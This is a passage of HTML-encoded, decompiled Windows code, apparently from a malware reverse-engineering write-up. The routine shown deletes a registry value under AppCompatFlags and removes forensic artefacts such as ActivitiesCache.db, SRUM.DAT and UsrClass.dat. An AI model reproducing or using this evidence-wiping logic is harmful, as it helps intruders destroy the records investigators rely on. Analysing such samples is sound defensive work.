style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003178\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002c0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400031aa\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppCompatFlags\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Comp atibility Assistant\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Store\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002c0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400031c4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteValueA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"DAM\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002c0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400031d7\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400031e6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003206\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002a0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">History\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">History.IE5\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">ActivitiesCache.db\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003215\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003224\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002a0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000322c\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000323b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000325b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000280 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">SRUM\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">SRUM.DAT\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000326a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003279\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000280 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003281\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003290\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400032b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000260 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microso ft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">UsrClass.dat\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400032bf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400032ce\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 